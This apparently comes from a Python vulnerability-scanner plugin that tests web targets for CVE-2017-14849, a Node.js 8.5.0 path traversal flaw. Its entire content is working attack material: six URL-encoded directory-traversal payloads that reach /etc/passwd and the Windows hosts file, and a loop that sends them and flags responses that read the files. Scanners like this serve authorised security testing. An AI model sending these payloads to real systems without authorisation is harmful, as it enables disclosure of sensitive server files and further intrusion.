#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2017_14849_payloads = [
    {'path': 'static/%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'},
    {'path': '%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'},
    {'path': 'static/%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts'},
    {'path': '%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts'},
    { 'path': 'static/%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:\\Windows\\System32\\drivers\\etc\\hosts'},
    { 'path': '%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:\\Windows\\System32\\drivers\\etc\\hosts'}
]

def cve_2017_14849_scan(self, clients):
    ''' Joyent Node.js 8.6.0之前的8.5.0版本中存在安全漏洞
        远程攻击者可利用该漏洞访问敏感文件
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'File-Read',
        'vul_id': 'CVE-2017-14849',
    }

    for payload in cve_2017_14849_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
